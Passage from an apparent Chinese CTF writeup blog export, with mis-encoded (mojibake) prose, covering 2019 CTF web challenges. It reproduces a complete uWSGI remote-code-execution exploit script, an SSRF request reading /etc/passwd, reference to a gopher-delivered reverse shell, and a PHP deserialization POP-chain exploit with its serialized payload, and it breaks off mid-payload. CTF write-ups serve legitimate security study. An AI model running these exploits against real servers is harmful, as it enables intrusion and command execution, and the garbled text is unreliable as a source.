å…¶ä¸­graphQLçš„APIæœåŠ¡å­˜åœ¨æ³¨å…¥ï¼Œå¯ä»¥ç›´æ¥åˆ©ç”¨ä¸‡èƒ½å¯†ç ç™»å½•ï¼Œå¹¶ä¸”user.pyä¸Šæœ‰ä¸ªsystemæ“ä½œï¼Œå¯ä»¥ç›´æ¥ssrf</a></p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">user.route(<span class="string">'/newimg'</span>, methods=[<span class="string">'POST'</span>,<span class="string">'GET'</span>])</span><br><span class="line">@login_required</span><br><span class="line">def test():</span><br><span class="line">    url = unquote(request.form.<span class="built_in">get</span>(<span class="string">'newurl'</span>))</span><br><span class="line">    <span class="keyword">if</span> re.match(<span class="string">"^[A-Za-z0-9-_%:./]*$"</span>,url):</span><br><span class="line">        filename = ramdom_str()</span><br><span class="line">        <span class="keyword">command</span> = <span class="string">"curl &#123;&#125; &gt; /tmp/&#123;&#125;"</span>.<span class="title">format</span>(<span class="title">url</span>, <span class="title">filename</span>)</span><br><span class="line">        os.<span class="keyword">system</span>(<span class="keyword">command</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"/tmp/&#123;&#125;"</span>.<span class="built_in">format</span>(filename),<span class="string">"rb"</span>) <span class="keyword">as</span> res:</span><br><span class="line">            res_data = res.<span class="built_in">read</span>()</span><br><span class="line">            res_data = base64.b64encode(res_data)</span><br><span class="line">            <span class="literal">return</span> res_data</span><br><span class="line">    <span class="literal">return</span> <span class="string">""</span></span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥æ„é€ ä¸‹æ³¨å…¥ç™»å…¥ï¼Œç„¶åssrfä¸€æ³¢å°±å¯ä»¥è¯»æ–‡ä»¶äº†</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">URLï¼š<span class="string">https:</span><span class="comment">//qqwwwwbbbbb.52dandan.xyz:8088/user/newimg</span></span><br><span class="line">POSTï¼šnewurl=<span class="string">file:</span><span class="comment">//etc/passwd</span></span><br></pre></td></tr></table></figure>
<p>è¯»nigixçš„é…ç½®æ–‡ä»¶åçŸ¥é“æœåŠ¡å™¨é…æœ‰uwsgiæœåŠ¡<br><img src="/2019/05/31/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E9%A2%98%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/8418106-eaaba9cc243d97a9.jpg" alt title="å›¾ç‰‡"></p>
<p>githubä¸Šæœ‰ä¸ªuwsgiçš„RCEè„šæœ¬</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="comment">######################</span></span><br><span class="line"><span class="comment"># Uwsgi RCE Exploit</span></span><br><span class="line"><span class="comment">######################</span></span><br><span class="line"><span class="comment"># Author: wofeiwo@80sec.com</span></span><br><span class="line"><span class="comment"># Created: 2017-7-18</span></span><br><span class="line"><span class="comment"># Last modified: 2018-1-30</span></span><br><span class="line"><span class="comment"># <span class="doctag">Note:</span> Just for research purpose</span></span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">import socket</span><br><span class="line">import argparse</span><br><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">def sz(x):</span><br><span class="line">    s = hex(x <span class="keyword">if</span> isinstance(x, int) <span class="keyword">else</span> len(x))[2:].rjust(4, <span class="string">'0'</span>)</span><br><span class="line">    <span class="keyword">if</span> sys.version_info[0] == 3: import bytes</span><br><span class="line">    s = bytes.fromhex(s) <span class="keyword">if</span> sys.version_info[0] == 3 <span class="keyword">else</span> s.decode(<span class="string">'hex'</span>)</span><br><span class="line">    return s[::-1]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pack_uwsgi_vars(var):</span><br><span class="line">    pk = b<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> var.items() <span class="keyword">if</span> hasattr(var, <span class="string">'items'</span>) <span class="keyword">else</span> var:</span><br><span class="line">        pk += sz(k) + k.encode(<span class="string">'utf8'</span>) + sz(v) + v.encode(<span class="string">'utf8'</span>)</span><br><span class="line">    result = b<span class="string">'\x00'</span> + sz(pk) + b<span class="string">'\x00'</span> + pk</span><br><span class="line">    # <span class="builtin-name">print</span>(urlencode(result))</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def parse_addr(addr, <span class="attribute">default_port</span>=None):</span><br><span class="line">   <span class="built_in"> port </span>= default_port</span><br><span class="line">    <span class="keyword">if</span> isinstance(addr, str):</span><br><span class="line">        <span class="keyword">if</span> addr.isdigit():</span><br><span class="line">            addr,<span class="built_in"> port </span>= <span class="string">''</span>, addr</span><br><span class="line">        elif <span class="string">':'</span> <span class="keyword">in</span> addr:</span><br><span class="line">            addr, _,<span class="built_in"> port </span>= addr.partition(<span class="string">':'</span>)</span><br><span class="line">    elif isinstance(addr, (list, tuple, set)):</span><br><span class="line">        addr,<span class="built_in"> port </span>= addr</span><br><span class="line">   <span class="built_in"> port </span>= int(port) <span class="keyword">if</span><span class="built_in"> port </span><span class="keyword">else</span> port</span><br><span class="line">    return (addr <span class="keyword">or</span> <span class="string">'127.0.0.1'</span>, port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_host_from_url(url):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'//'</span> <span class="keyword">in</span> url:</span><br><span class="line">        url = url.split(<span class="string">'//'</span>, 1)[1]</span><br><span class="line">    host, _, url = url.partition(<span class="string">'/'</span>)</span><br><span class="line">    return (host, <span class="string">'/'</span> + url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def fetch_data(uri, <span class="attribute">payload</span>=None, <span class="attribute">body</span>=None):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'http'</span> <span class="keyword">not</span> <span class="keyword">in</span> uri:</span><br><span class="line">        uri = <span class="string">'http://'</span> + uri</span><br><span class="line">    s = requests.Session()</span><br><span class="line">    # s.headers[<span class="string">'UWSGI_FILE'</span>] = payload</span><br><span class="line">    <span class="keyword">if</span> body:</span><br><span class="line">        import urlparse</span><br><span class="line">        body_d = dict(urlparse.parse_qsl(urlparse.urlsplit(body).path))</span><br><span class="line">        d = s.post(uri, <span class="attribute">data</span>=body_d)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        d = s.<span class="builtin-name">get</span>(uri)</span><br><span class="line"></span><br><span class="line">    return &#123;</span><br><span class="line">        <span class="string">'code'</span>: d.status_code,</span><br><span class="line">        <span class="string">'text'</span>: d.text,</span><br><span class="line">        <span class="string">'header'</span>: d.headers</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def ask_uwsgi(addr_and_port, mode, var, <span class="attribute">body</span>=<span class="string">''</span>):</span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">'tcp'</span>:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect(parse_addr(addr_and_port))</span><br><span class="line">    elif mode == <span class="string">'unix'</span>:</span><br><span class="line">        s = socket.socket(socket.AF_UNIX)</span><br><span class="line">        s.connect(addr_and_port)</span><br><span class="line">    tmp = (pack_uwsgi_vars(var) + body.encode(<span class="string">'utf8'</span>))</span><br><span class="line">    <span class="attribute">tmp</span>=urllib.quote(tmp)</span><br><span class="line">    <span class="builtin-name">print</span>(tmp)</span><br><span class="line">    s.send(pack_uwsgi_vars(var) + body.encode(<span class="string">'utf8'</span>))</span><br><span class="line">    response = []</span><br><span class="line">    # Actually we dont need the response, it will block <span class="keyword">if</span> we <span class="builtin-name">run</span> any commands.</span><br><span class="line">    # So I comment all the receiving stuff. </span><br><span class="line">    # <span class="keyword">while</span> 1:</span><br><span class="line">    #     data = s.recv(4096)</span><br><span class="line">    #     <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">    #         break</span><br><span class="line">    #     response.append(data)</span><br><span class="line">    s.close()</span><br><span class="line">    return b<span class="string">''</span>.join(response).decode(<span class="string">'utf8'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def curl(mode, addr_and_port, payload, target_url):</span><br><span class="line">    host, uri = get_host_from_url(target_url)</span><br><span class="line">    path, _, qs = uri.partition(<span class="string">'?'</span>)</span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">'http'</span>:</span><br><span class="line">        return fetch_data(addr_and_port+uri, payload)</span><br><span class="line">    elif mode == <span class="string">'tcp'</span>:</span><br><span class="line">        host = host <span class="keyword">or</span> parse_addr(addr_and_port)[0]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host = addr_and_port</span><br><span class="line">    var = &#123;</span><br><span class="line">        <span class="string">'SERVER_PROTOCOL'</span>: <span class="string">'HTTP/1.1'</span>,</span><br><span class="line">        <span class="string">'REQUEST_METHOD'</span>: <span class="string">'GET'</span>,</span><br><span class="line">        <span class="string">'PATH_INFO'</span>: path,</span><br><span class="line">        <span class="string">'REQUEST_URI'</span>: uri,</span><br><span class="line">        <span class="string">'QUERY_STRING'</span>: qs,</span><br><span class="line">        <span class="string">'SERVER_NAME'</span>: host,</span><br><span class="line">        <span class="string">'HTTP_HOST'</span>: host,</span><br><span class="line">        <span class="string">'UWSGI_FILE'</span>: payload,</span><br><span class="line">        <span class="string">'SCRIPT_NAME'</span>: target_url</span><br><span class="line">    &#125;</span><br><span class="line">    return ask_uwsgi(addr_and_port, mode, var)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main(<span class="number">*a</span>rgs):</span><br><span class="line">    desc = <span class="string">""</span><span class="string">"</span></span><br><span class="line"><span class="string">    This is a uwsgi client &amp; RCE exploit.</span></span><br><span class="line"><span class="string">    Last modifid at 2018-01-30 by wofeiwo@80sec.com</span></span><br><span class="line"><span class="string">    "</span><span class="string">""</span></span><br><span class="line">    elog = <span class="string">"Exampleï¼šuwsgi_exp.py -u 1.2.3.4:5000 -c \"echo 111&gt;/tmp/abc\""</span></span><br><span class="line">    </span><br><span class="line">    parser = argparse.ArgumentParser(<span class="attribute">description</span>=desc, <span class="attribute">epilog</span>=elog)</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">'-m'</span>, <span class="string">'--mode'</span>, <span class="attribute">nargs</span>=<span class="string">'?'</span>, <span class="attribute">default</span>=<span class="string">'tcp'</span>,</span><br><span class="line">                        <span class="attribute">help</span>=<span class="string">'Uwsgi mode: 1. http 2. tcp 3. unix. The default is tcp.'</span>,</span><br><span class="line">                        <span class="attribute">dest</span>=<span class="string">'mode'</span>, choices=[<span class="string">'http'</span>, <span class="string">'tcp'</span>, <span class="string">'unix'</span>])</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">'-u'</span>, <span class="string">'--uwsgi'</span>, <span class="attribute">nargs</span>=<span class="string">'?'</span>, <span class="attribute">required</span>=<span class="literal">True</span>,</span><br><span class="line">                        <span class="attribute">help</span>=<span class="string">'Uwsgi server: 1.2.3.4:5000 or /tmp/uwsgi.sock'</span>,</span><br><span class="line">                        <span class="attribute">dest</span>=<span class="string">'uwsgi_addr'</span>)</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">'-c'</span>, <span class="string">'--command'</span>, <span class="attribute">nargs</span>=<span class="string">'?'</span>, <span class="attribute">required</span>=<span class="literal">True</span>,</span><br><span class="line">                        <span class="attribute">help</span>=<span class="string">'Command: The exploit command you want to execute, must have this.'</span>,</span><br><span class="line">                        <span class="attribute">dest</span>=<span class="string">'command'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; 2:</span><br><span class="line">        parser.print_help()</span><br><span class="line">        return</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> args.mode.lower() == <span class="string">"http"</span>:</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">"[-]Currently only tcp/unix method is supported in RCE exploit."</span>)</span><br><span class="line">        return</span><br><span class="line">    payload = <span class="string">'exec://'</span> + args.command + <span class="string">"; echo test"</span> # must have someting <span class="keyword">in</span> output <span class="keyword">or</span> the uWSGI crashs.</span><br><span class="line">    # <span class="builtin-name">print</span>(payload)</span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">"[*]Sending payload."</span>)</span><br><span class="line">    <span class="builtin-name">print</span> payload</span><br><span class="line">    <span class="builtin-name">print</span>(curl(args.mode.lower(), args.uwsgi_addr, payload, <span class="string">'/testapp'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>æ‰“å°å‡ºgohperï¼Œé€šè¿‡ssrfç”¨pythonçš„åå¼¹shellæ“ä½œæ‰“ä¸€æ³¢3031ç«¯å£å°±å¥½äº†ï¼Œå°±å¯ä»¥æ‹¿åˆ°shellï¼ˆç»§ç»­ç›—bertramå›¾ï¼‰<br><img src="/2019/05/31/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E9%A2%98%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/8418106-a4b2af8b04d85f1d.jpg" alt title="å›¾ç‰‡"><br><img src="http://upload-images.jianshu.io/upload_images/8418106-914eeb834f1b33b6?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<p>æç¤ºæœ‰socksä»£ç†ï¼Œæ‰«ä¸€æ³¢å‘ç°172.16.17.4æœ‰1080ç«¯å£ï¼Œæ‰€ä»¥åšä¸ªä»£ç†å°±å¥½äº†ï¼Œå¸ˆå‚…ä»¬éƒ½ç”¨ewçš„ï¼Œè¿™ä¸ªå°±ä¸ä»‹ç»äº†ï¼Œè½¬å‘å‡ºæ¥äº†å°±ç›´æ¥ç”¨å…¬ç½‘æ‰“å°±å¥½äº†ï¼Œå¹¶ä¸”å®˜æ–¹æœ€åå…¬å¸ƒäº†å†…ç½‘æœåŠ¡çš„æºç ï¼Œå…¶å®åœ¨å†…ç½‘çš„æ—¶å€™æœ‰ç€å„ä¸ªå¸ˆå‚…ä»¬æ­å¥½çš„è·¯ï¼Œç›´æ¥æŠ„ä½œä¸šå°±å¥½äº†ï¼Œ2333ï¼Œæ‰§è¡Œæµç¨‹åº”è¯¥æ˜¯æ˜¯ï¼ˆæ”¹bertramè¡¨è¿°ï¼‰ï¼Œæ„é€ ååºåˆ—åŒ–payload<br>User 1 -&gt; POST /adduser username=payload&amp;password=<br>User 1 -&gt; /savelog ä¿®æ”¹ User2 session<br>User 2 -&gt; ç™»å½•è§¦å‘ååºåˆ—åŒ–<br>User 2 -&gt; getflag<br>ï¼ˆæœ€åçš„æˆ‘æ²¡æµ‹ï¼Œæ‰“å®Œå°±è·‘è·¯äº†ï¼Œè¢«è‡ªå·±èœå“­äº†ï¼‰</p>
<h3 id="0x07-babywp"><a href="#0x07-babywp" class="headerlink" title="0x07 babywp"></a>0x07 babywp</h3><p>webpwnï¼Œæœæ–­æ”¾å¼ƒï¼Œçœ‹å®˜æ–¹WPå°±å¥½äº†</p>
]]></content>
      <categories>
        <category>Cyc1eçš„CTFä¹‹è·¯</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>SQL</tag>
        <tag>ååºåˆ—åŒ–</tag>
        <tag>uwsgi</tag>
      </tags>
  </entry>
  <entry>
    <title>2019 å…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›åˆ›æ–°èƒ½åŠ›å®è·µèµ›3é“Web Writeup</title>
    <url>/2019/04/23/2019-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E8%83%BD%E5%8A%9B%E5%AE%9E%E8%B7%B5%E8%B5%9B3%E9%81%93Web-Writeup/</url>
    <content><![CDATA[<h3 id="0x01-JustSoso"><a href="#0x01-JustSoso" class="headerlink" title="0x01 JustSoso"></a>0x01 JustSoso</h3><p>æœ¬é¢˜çš„ä¸»è¦çŸ¥è¯†ç‚¹åœ¨äºååºåˆ—åŒ–çš„åº”ç”¨å’Œparse_url()å‡½æ•°çš„è§£æé—®é¢˜ï¼Œé¦–å…ˆé€šè¿‡ç½‘é¡µæºç ä¸­çš„æ–‡ä»¶è¯»å–æç¤ºè¯»å–å¾—åˆ°index.phpæ–‡ä»¶æºç å’Œhintæ–‡ä»¶æºç ï¼Œä»»æ„æ–‡ä»¶è¯»å–å°±ä¸åšä»‹ç»äº†ã€‚</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">#index.php</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>); </span></span><br><span class="line"><span class="php">$file = $_GET[<span class="string">"file"</span>]; </span></span><br><span class="line"><span class="php">$payload = $_GET[<span class="string">"payload"</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!<span class="keyword">isset</span>($file))&#123;</span></span><br><span class="line"><span class="php">	<span class="keyword">echo</span> <span class="string">'Missing parameter'</span>.<span class="string">'&lt;br&gt;'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span></span><br><span class="line"><span class="php">	<span class="keyword">die</span>(<span class="string">'hack attacked!!!'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">@<span class="keyword">include</span>($file);</span></span><br><span class="line"><span class="php">print_r($payload);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($payload))&#123;  </span></span><br><span class="line"><span class="php">    $url = parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span></span><br><span class="line"><span class="php">    parse_str($url[<span class="string">'query'</span>],$query);</span></span><br><span class="line"><span class="php">    <span class="keyword">foreach</span>($query <span class="keyword">as</span> $value)&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (preg_match(<span class="string">"/flag/"</span>,$value)) &#123; </span></span><br><span class="line"><span class="php">    	    <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>);</span></span><br><span class="line"><span class="php">    	    <span class="keyword">exit</span>();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $payload = unserialize($payload);</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span>&#123; </span></span><br><span class="line"><span class="php">   <span class="keyword">echo</span> <span class="string">"Missing parameters"</span>; </span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="comment">&lt;!--Please test index.php?file=xxx.php --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--Please get the source of hint.php--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#hint.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $handle;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Waking up\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = $handle;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>, <span class="number">10000</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>, <span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨index.phpä¸­çš„ååºåˆ—åŒ–å‡½æ•°unserialize()åŠ ä¸Šhint.phpæ–‡ä»¶ï¼Œå¾ˆæ˜¾ç„¶æ˜¯é€šè¿‡ååºåˆ—åŒ–çš„æ–¹å¼æ¥è¯»å–flag.phpæ–‡ä»¶ï¼Œå…ˆä¸çœ‹unserialize()å‰çš„è¿‡æ»¤è§„åˆ™ï¼Œå¯¹hint.phpè¿›è¡Œåºåˆ—åŒ–æ„é€ ã€‚è€Œåœ¨hint.phpæ–‡ä»¶ä¸­ï¼Œä¸»è¦è§¦å‘echo @highlight_file($this-&gt;file, true)ï¼Œè€Œè§¦å‘è¦è§£å†³çš„ä¸»è¦æ˜¯ $this-&gt;token == $this-&gt;token_flagçš„é—®é¢˜ï¼Œå®ä¾‹åŒ–Handleåï¼Œ$handleæ˜¯å¯æ§çš„ï¼Œå¹¶ä¸”ç±»Handleä¸­çš„é­”æœ¯æ–¹æ³•__destructä¼šè§¦å‘Flagç±»ä¸­çš„getFlag()å‡½æ•°æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦åˆ©ç”¨$handleæ¥ç»™Flagç±»ä¸­çš„å˜é‡èµ‹å€¼å³å¯ã€‚è€Œå¯¹äºtokenå’Œtoken_flagå€¼çš„æ¯”è¾ƒï¼Œå¯ä»¥é‡‡ç”¨å¼•ç”¨çš„æ–¹æ³•è¿›è¡Œç»•è¿‡ï¼Œå³$this-&gt;token = &amp;$this-&gt;token_flag;æ‰€ä»¥æœ€ç»ˆæ„é€ ä¸ºï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> $handle;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">foreach</span> (get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"Waking up\n"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;handle = $handle;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $file;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $token;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $token_flag;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;file = $file;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>, <span class="number">10000</span>));</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>, <span class="number">10000</span>));</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>);</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$Flag = <span class="keyword">new</span> Flag();</span></span><br><span class="line"><span class="php">$Flag-&gt;file = <span class="string">"flag.php"</span>;</span></span><br><span class="line"><span class="php">$Flag-&gt;token = &amp;$Flag-&gt;token_flag;</span></span><br><span class="line"><span class="php">$test = <span class="keyword">new</span> Handle($Flag);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> urlencode(serialize($test));</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>ç”Ÿæˆåºåˆ—åŒ–æ•°æ®ï¼Œç”±äºåºåˆ—åŒ–åæœ‰ä¸å¯è§å­—ç¬¦ï¼Œæ‰€ä»¥åˆ©ç”¨urlencodeå‡½æ•°è¿›è¡Œç¼–ç è¾“å‡ºä¸º</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">O%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>Handle%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Handle%<span class="number">00</span>handle%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>Flag%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22f</span>ile%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22f</span>lag.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>token%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A32%<span class="number">3</span>A%<span class="number">2262e7f</span>2e090fe150ef8deb4466fdc81b3%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>token_flag%<span class="number">22</span>%<span class="number">3</span>BR%<span class="number">3</span>A4%<span class="number">3</span>B%<span class="number">7</span>D%<span 